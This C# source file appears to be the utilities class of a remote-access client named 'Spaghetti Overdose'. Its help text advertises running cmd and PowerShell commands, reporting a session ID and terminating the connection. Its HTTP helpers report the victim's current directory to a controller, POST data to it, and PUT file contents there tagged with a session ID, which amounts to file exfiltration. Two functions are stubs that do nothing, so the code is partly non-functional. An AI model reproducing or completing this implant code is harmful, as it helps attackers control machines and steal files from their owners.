using System;
using System.IO;
using System.Net;
using System.Text;
using System.Text.RegularExpressions;

class Utilities
{
    // Get Help
    public static string PrintHelp()
    {
        return "!#!\n  Spaghetti Overdose\n" +
            " ----------------------------------------------------------\n" +
            "   <command>               Run cmd command [Default]" +
            "   help                    Print this message\n" +
            "   powershell <command>    Run powershell command\n" +
            "   session                 Get session ID\n" +
            "   terminate               Close the client connection\n";

    }

    // File to byte[]
    public static byte[] FileToByte(string location, string filename)
    {
        string filepath = String.Concat(location, Path.DirectorySeparatorChar, filename);
        return new byte[0];
    }


    // Interactive Command Line Protection
    public static bool CliProtection(string cmd)
    {
        return true;
    }

    // Check Root Dir
    public static string IsRoot(string location)
    {
        if (location.Length < 3 && Regex.IsMatch(location, @"[A-Za-z]{1}:"))
        {
            return String.Concat(location, "\\");
        }
        return location;
    }

    // HTTP Get Request
    public static string Get(string uri, string location)
    {
        HttpWebRequest request = (HttpWebRequest)WebRequest.Create(uri);
        request.Headers.Add("Current-Location", location);
        request.AutomaticDecompression = DecompressionMethods.GZip | DecompressionMethods.Deflate;

        using (HttpWebResponse response = (HttpWebResponse)request.GetResponse())
        using (Stream stream = response.GetResponseStream())
        using (StreamReader reader = new StreamReader(stream))
        {
            return reader.ReadToEnd();
        }
    }

    // HTTP Post Request
    public static string Post(string uri, string data, string contentType = "text/html", string method = "POST")
    {
        byte[] dataBytes = Encoding.UTF8.GetBytes(data);

        HttpWebRequest request = (HttpWebRequest)WebRequest.Create(uri);
        request.AutomaticDecompression = DecompressionMethods.GZip | DecompressionMethods.Deflate;
        request.ContentLength = dataBytes.Length;
        request.ContentType = contentType;
        request.Method = method;


        using (Stream requestBody = request.GetRequestStream())
        {
            requestBody.Write(dataBytes, 0, dataBytes.Length);
        }

        using (HttpWebResponse response = (HttpWebResponse)request.GetResponse())
        using (Stream stream = response.GetResponseStream())
        using (StreamReader reader = new StreamReader(stream))
        {
            return reader.ReadToEnd();
        }
    }

    // HTTP Put Request
    public static string Put(string uri, byte[] data, string sessionid, string method = "PUT")
    {
        using(var client = new System.Net.WebClient())
        {
            client.Headers.Add("Session-Id", sessionid);
            client.UploadData(uri, method, data);
        }
        return "File uploaded";
    }

}
    